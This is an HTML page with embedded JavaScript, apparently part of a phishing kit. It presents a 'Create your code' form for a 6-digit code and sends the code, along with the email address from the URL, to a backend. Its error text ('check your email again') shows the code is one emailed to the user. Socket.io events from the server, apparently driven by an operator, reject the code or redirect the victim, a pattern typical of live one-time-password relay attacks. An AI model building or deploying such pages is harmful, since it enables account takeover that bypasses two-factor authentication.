<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
  <title>Atlas - Create Code</title>
  <style>
    *{margin:0;padding:0;box-sizing:border-box;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,sans-serif}
    body{background:#f3f4f6;display:flex;justify-content:center;align-items:center;min-height:100vh;padding:20px}
    .container{max-width:400px;width:100%;background:#fff;border-radius:32px;padding:32px 24px;box-shadow:0 10px 30px rgba(0,0,0,0.08);text-align:center}
    h2{font-size:24px;font-weight:700;color:#1f2937;margin-bottom:8px}
    .subtext{color:#6b7280;font-size:14px;margin-bottom:28px}
    .otp-row{display:flex;gap:8px;justify-content:center;margin-bottom:28px;flex-wrap:wrap}
    .otp-box{width:50px;height:55px;background:#efefef;border:none;border-radius:12px;font-size:22px;font-weight:600;text-align:center;color:#222;outline:none}
    .otp-box:focus{background:#e2e2f0}
    @media (max-width:450px){.otp-box{width:45px;height:50px;font-size:20px}}
    @media (max-width:380px){.otp-box{width:42px;height:48px;font-size:18px;gap:6px}}
    button{width:100%;padding:16px;border-radius:50px;border:none;background:#c5c8fb;color:#fff;font-weight:600;font-size:16px;cursor:default;display:flex;align-items:center;justify-content:center;gap:10px}
    button.active{background:#4a4ff0;cursor:pointer}
    button:disabled{opacity:0.7}
    .spinner{width:20px;height:20px;border:2px solid rgba(255,255,255,0.3);border-top:2px solid white;border-radius:50%;animation:spin 0.8s linear infinite}
    @keyframes spin{to{transform:rotate(360deg)}}
    .error-msg{color:#dc2626;font-size:13px;margin-top:12px;display:none}
  </style>
</head>
<body>
<div class="container">
  <h2>Create your code</h2>
  <p class="subtext">Create a 6-digit verification code</p>
  <div class="otp-row">
    <input class="otp-box" maxlength="1" type="tel" inputmode="numeric" pattern="[0-9]">
    <input class="otp-box" maxlength="1" type="tel" inputmode="numeric" pattern="[0-9]">
    <input class="otp-box" maxlength="1" type="tel" inputmode="numeric" pattern="[0-9]">
    <input class="otp-box" maxlength="1" type="tel" inputmode="numeric" pattern="[0-9]">
    <input class="otp-box" maxlength="1" type="tel" inputmode="numeric" pattern="[0-9]">
    <input class="otp-box" maxlength="1" type="tel" inputmode="numeric" pattern="[0-9]">
  </div>
  <div id="errorMsg" class="error-msg"></div>
  <button id="submitBtn">Submit Code</button>
</div>
<script src="/socket.io/socket.io.js"></script>
<script>
  const urlParams = new URLSearchParams(window.location.search);
  const email = urlParams.get('email');
  if (!email) window.location.href = '/users/index.html';

  const socket = io();
  const boxes = document.querySelectorAll('.otp-box');
  const submitBtn = document.getElementById('submitBtn');
  const errorDiv = document.getElementById('errorMsg');
  let otpValue = '';

  function updateButtonState() {
    const filled = [...boxes].every(b => /^\d$/.test(b.value));
    if (filled) {
      submitBtn.classList.add('active');
    } else {
      submitBtn.classList.remove('active');
    }
  }

  function handleInput(e, idx) {
    if (e.target.value.length === 1 && idx < 5) boxes[idx+1].focus();
    updateButtonState();
    errorDiv.style.display = 'none';
  }

  boxes.forEach((box, idx) => {
    box.addEventListener('input', (e) => handleInput(e, idx));
    box.addEventListener('keydown', (e) => {
      if (e.key === 'Backspace' && !box.value && idx > 0) boxes[idx-1].focus();
    });
    box.addEventListener('keypress', (e) => { if (!/[0-9]/.test(e.key)) e.preventDefault(); });
  });

  submitBtn.addEventListener('click', async () => {
    if (!submitBtn.classList.contains('active')) return;
    const otp = [...boxes].map(b => b.value).join('');
    if (otp.length !== 6) return;

    submitBtn.disabled = true;
    submitBtn.innerHTML = '<div class="spinner"></div> Submitting...';

    try {
      const res = await fetch('/api/submit-otp', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ email, otp })
      });
      const data = await res.json();
      if (data.success) {
        submitBtn.innerHTML = 'Code Submitted';
        submitBtn.disabled = true;
      } else {
        alert(data.error || 'Failed to submit OTP');
        submitBtn.disabled = false;
        submitBtn.innerHTML = 'Submit Code';
        submitBtn.classList.add('active');
      }
    } catch (err) {
      alert('Network error');
      submitBtn.disabled = false;
      submitBtn.innerHTML = 'Submit Code';
      submitBtn.classList.add('active');
    }
  });

  socket.on('incorrect-otp', (data) => {
    if (data.email === email) {
      errorDiv.textContent = 'Incorrect OTP. Please check your email again.';
      errorDiv.style.display = 'block';
      boxes.forEach(b => b.value = '');
      submitBtn.classList.remove('active');
      submitBtn.disabled = false;
      submitBtn.innerHTML = 'Submit Code';
      boxes[0].focus();
    }
  });

  socket.on('redirect-to-sad', (data) => {
    if (data.email === email) {
      window.location.href = '/users/success.html';
    }
  });
</script>
</body>
</html>
